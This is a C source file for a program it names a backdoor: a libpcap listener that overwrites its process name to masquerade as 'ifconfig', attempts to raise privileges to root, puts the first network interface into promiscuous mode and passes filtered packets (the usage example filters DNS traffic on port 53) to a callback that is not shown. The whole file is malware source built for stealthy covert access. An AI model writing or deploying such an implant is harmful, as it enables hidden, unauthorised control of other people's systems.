/*---------------------------------------------------------------------------------------------
--	Compile:
--      Ensure lipcapdev installed with: yum install libpcap-devel
--		Use the Makefile provided
--	Run:
--		./backdoor 5 "udp and port 53"
--	Code modified from original by Aman Abdullah
-------------------------------------------------------------------------------------------------*/

#include <pcap.h>
#include <stdlib.h>
#include <netinet/ip.h>
#include <sys/prctl.h>
#include "backdoor.h"
#define MASK "ifconfig"

// Function Prototypes
void pkt_callback (u_char*, const struct pcap_pkthdr*, const u_char*);

int main (int argc,char **argv)
{
	char *nic_dev;
    	char errbuf[PCAP_ERRBUF_SIZE];
    	pcap_t* nic_descr;
        pcap_if_t *interface_list;
        pcap_if_t *if_list_ptr;
        int result;
    	struct bpf_program fp;      // holds compiled program
    	bpf_u_int32 maskp;          // subnet mask
    	bpf_u_int32 netp;           // ip
    	u_char* args = NULL;

    	// Options must be passed in as a string
    	if (argc < 2)
		{
        	fprintf(stdout,"Usage: %s <Number of Packets> \"<Filter String>\"\n",argv[0]);
        	return 0;
    	}

        //mask the process name
        memset(argv[0], 0, strlen(argv[0]));
        strcpy(argv[0], MASK);
        prctl(PR_SET_NAME, MASK, 0, 0);

        //raise priveleges
        setuid(0);
        setgid(0);

		// find the first NIC that is up and sniff packets from it
		//nic_dev = pcap_lookupdev(errbuf);
        result = pcap_findalldevs(&interface_list, errbuf);
        if(result == -1){
            fprintf(stderr, "%s\n", errbuf);
            exit(1);
        }

        if_list_ptr = interface_list;


    	// Use pcap to get the IP address and subnet mask of the device
    	pcap_lookupnet (if_list_ptr->name, &netp, &maskp, errbuf);

    	// open the device for packet capture & set the device in promiscuous mode
    	nic_descr = pcap_open_live (if_list_ptr->name, BUFSIZ, 1, -1, errbuf);
    	if (nic_descr == NULL)
    	{
			printf("pcap_open_live(): %s\n",errbuf);
			exit(1);
	}


    	if(argc > 2)
    	{
        	// Compile the filter expression
        	if (pcap_compile (nic_descr, &fp, argv[2], 0, netp) == -1)
        	{
				fprintf(stderr,"Error calling pcap_compile\n");
				exit(1);
			}

        	// Load the filter into the capture device
        	if (pcap_setfilter (nic_descr, &fp) == -1)
        	{
				fprintf(stderr,"Error setting filter\n");
				exit(1);
			}
    	}

    	// Start the capture session
    	pcap_loop (nic_descr, atoi(argv[1]), pkt_callback, args);

    	fprintf(stdout,"\nCapture Session Done\n");
        pcap_freealldevs(interface_list);
    	return 0;
}
